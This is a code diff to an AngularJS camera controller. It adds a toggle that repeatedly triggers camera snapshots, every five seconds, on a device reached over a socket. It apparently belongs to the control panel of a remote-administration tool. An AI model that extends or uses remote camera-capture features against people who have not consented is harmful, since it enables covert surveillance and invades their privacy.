@@ -101,7 +101,7 @@ app.controller("LabCtrl", function($scope, $rootScope, $location) {
 
 //-----------------------Camera Controller (camera.htm)------------------------
 // camera controller
-app.controller("CamCtrl", function($scope, $rootScope) {
+app.controller("CamCtrl", function($scope, $rootScope, $interval) {
     $camCtrl = $scope;
     $camCtrl.isSaveShown = false;
     var camera = CONSTANTS.orders.camera;
@@ -167,6 +167,40 @@ app.controller("CamCtrl", function($scope, $rootScope) {
         socket.emit(ORDER, { order: camera, extra: $camCtrl.selectedCam.id });
     }
 
+	/*Variables Streamming*/
+	$camCtrl.isStreamming = false;
+	var c = 1;
+	var timer;
+	
+	/*Funcion Streamming*/
+	$scope.webstream = () => {
+
+	  $rootScope.Log('Streamming', CONSTANTS.logStatus.SUCCESS);
+	
+      if($camCtrl.isStreamming == true){
+		$camCtrl.isStreamming = false;
+      }else
+	  {
+		$camCtrl.isStreamming = true;
+	  }
+	  
+	  if($camCtrl.isStreamming == true){
+			timer = $interval(function(){
+				$camCtrl.snap();
+				$rootScope.Log('Transmitiendo...' + c, CONSTANTS.logStatus.SUCCESS);
+			c++;
+		  },5000);
+      }else
+	  {
+		  if(angular.isDefined(timer))
+          {
+            $interval.cancel(timer);
+            timer=undefined;
+			c = 1;
+			$rootScope.Log('Cancelando transmision', CONSTANTS.logStatus.SUCCESS);
+          }
+	  }
+    }
 
 
 
